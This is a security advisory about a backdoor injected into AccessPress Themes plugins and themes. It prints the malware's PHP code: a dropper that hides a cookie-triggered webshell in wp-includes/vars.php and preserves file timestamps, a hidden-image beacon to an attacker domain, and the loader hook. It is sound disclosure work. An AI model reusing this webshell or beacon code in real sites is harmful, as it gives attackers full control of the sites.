# Backdoor Found in Themes and Plugins from AccessPress Themes

Updated on June 11, 2022 - Harald Eilertsen

**Update Feb. 1 –** Changed the “Affected themes” section to reflect that new versions of the themes are starting to appear.

While investigating a compromised site we discovered some suspicious code in a theme by AccessPress Themes (aka Access Keys), a vendor with a large number of popular themes and plugins. On further investigation, we found that all the themes and most plugins from the vendor contained this suspicious code, but only if downloaded from their own website. The same extensions were fine if downloaded or installed directly from the WordPress.org directory.

Due to the way the extensions were compromised, we suspected an external attacker had breached the website of AccessPress Themes in an attempt to use their extensions to infect further sites.

We contacted the vendor immediately, but at first we did not receive a response. After escalating it to the WordPress.org plugin team, our suspicions were confirmed. AccessPress Themes websites were breached in the first half of September 2021, and the extensions available for download on their site were injected with a backdoor.

Once we had established a channel for communicating with the vendor, we shared our detailed findings with them. They immediately removed the offending extensions from their website.

Most of the plugins have since been updated, and known clean versions are listed towards the bottom of this post. However, the affected themes have not been updated, and are pulled from the WordPress.org theme repository. If you have any of the themes listed towards the bottom of this post installed on your site, we recommend migrating to a new theme as soon as possible.

This disclosure concerns a large number of extensions, both plugins and themes. Skip to the list below, or read on for the details.

## Details:

Vendor: AccessPress Themes
Vendor url: <https://accesspressthemes.com>
Plugins: multiple
Themes: multiple
CVE: CVE-2021-24867

## Analysis:

The infected extensions contained a dropper for a webshell that gives the attackers full access to the infected sites. The dropper is located in the file `inital.php` located in the main plugin or theme directory. When run it installs a cookie based webshell in `wp-includes/vars.php`. The shell is installed as a function just in front of the `wp_is_mobile()` function with the name of `wp_is_mobile_fix()`. This is presumably to not arouse suspicion to anybody casually scrolling through the `vars.php` file.

```

function makeInit() {
    $b64 = 'ba' . 'se64' . '_dec' . 'ode';
    $b = 'ZnVuY3Rpb2........TsKCg==';

    $f = $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/vars.php';
    if(file_exists($f)) {
        $fp = 0777 & @fileperms($f);
        $ft = @filemtime($f);
        $fc = @file_get_contents($f);
        if(strpos($fc, 'wp_is_mobile_fix') === false) {
            $fc = str_replace('function wp_is_mobile()',
                $b64($b) . 'function wp_is_mobile()',
                $fc);
            @file_put_contents($f, $fc);
            @touch($f, $ft);
            @chmod($f, $fp);
        }
        return true;
    }
    return false;
}

```

Once the shell is installed, the dropper will phone home by loading a remote image from the URL `hxxps://www.wp-theme-connect.com/images/wp-theme.jpg` with the url of the infected site and information about which theme it uses as query arguments. Finally, it will remove the dropper source file to avoid detection when the request is finished executing.

```

function finishInit() {
    unlink(__FILE__);
}

add_action( 'admin_notices', 'wp_notice_plug', 20 );
if ( !function_exists( 'wp_notice_plug' ) ) {

    function wp_notice_plug() {
        echo '<img style="display: none;" src="https://www.wp-theme-connect.com/images/wp-theme.jpg?ph=' . $_SERVER["HTTP_HOST"] . '&phn=accesspress-anonymous-post">';
    }

}
register_shutdown_function('finishInit');

```

The webshell itself triggers if the user agent string in the request is `wp_is_mobile` and the request contains eight specific cookies. It pieces together and executes a payload from these supplied cookies.

```

	$is_wp_mobile = ($_SERVER['HTTP_USER_AGENT'] == 'wp_is_mobile');
	$g = $_COOKIE;

	(count($g) == 8 && $is_wp_mobile) ?
	(($qr = $g[33].$g[32]) && ($iv = $qr($g[78].$g[18])) &&
	($_iv = $qr($g[12].$g[17])) && ($_iv = @$iv($g[10], $_iv($qr($g[53])))) &&
	@$_iv()) : $g;

```

We have also seen another, presumably older, variant of the backdoor directly embedded in the theme/plugin’s `functions.php` file. This variant uses the same mechanism with piecing together the payload from eight cookies, but does not filter on the request’s user agent string.

To ensure that the dropper is executed, the main plugin file (for plugins) or the `functions.php` file (for themes) have been modified with code to execute the `inital.php` file if it exists.

```

if(is_admin()) {
    add_action( "init", 'apap_plugin_check' );
}

function apap_plugin_check(){
    if(file_exists(__DIR__ . "/inital.php")){
        include(__DIR__ . "/inital.php");
    }
}

```

One striking detail from the timestamps of the compromised plugins is that they are all from early September. The majority are from September 6 and 7, with a few files from September 2 and 3. Similarly for the themes, all were compromised on September 22, except `accessbuddy` on September 9.

Also, the timestamps within the zip-archives are very uniform, with almost all files with the exact same timestamp, except for the modified main plugin file and the added dropper file that is stamped a few minutes later (usually about 2-5 minutes after the other files in the archive).

Looking at the timestamps for the zip-files downloaded from the `wordpress.org` repository however, we find a distribution of timestamps corresponding to when plugin/theme was actually updated. Also the distribution of timestamps within the archive is less uniform and reflects which files were updated in the release, and which are unchanged from an older release.

This suggests to us that the files from the AccessPress Themes’ website were modified intentionally, and as a coordinated action after they were originally released. The compromise seems to have been performed in two stages, one for the plugins and a later one for the themes. Each of them with some earlier attempts, possibly to fine tune the process.

Our investigation has only looked at the themes and plugins freely available from the AccessPress Themes’ website. We assume their paid pro themes are affected similarly, but we have not examined these. If you have any of these, please contact AccessPress Themes’ support for further advice.

## Affected themes

If you have any of the following themes with a version number in the *Bad* column installed on your site, we do recommend to upgrade to the version in the *Clean* column immediately. It’s worth noting that the themes installed through WordPress.org are clean, even if they are listed in the *Bad* column. We still recommend upgrading to the known clean version to be on the safe side.

Themes with no version number in the *Clean* column have not yet been upgraded, and we recommend replacing it with another theme if at all possible.

## WordPress Plugin Vulnerabilities

# Backdoored Plugins & Themes from AccessPress Themes

### Description

Numerous Plugins and Themes from the AccessPress Themes (aka Access Keys) vendor are backdoored due to their website being compromised. Only plugins and themes downloaded via the vendor website are affected, and those hosted on wordpress.org are not. However, all of them were updated or removed to avoid any confusion
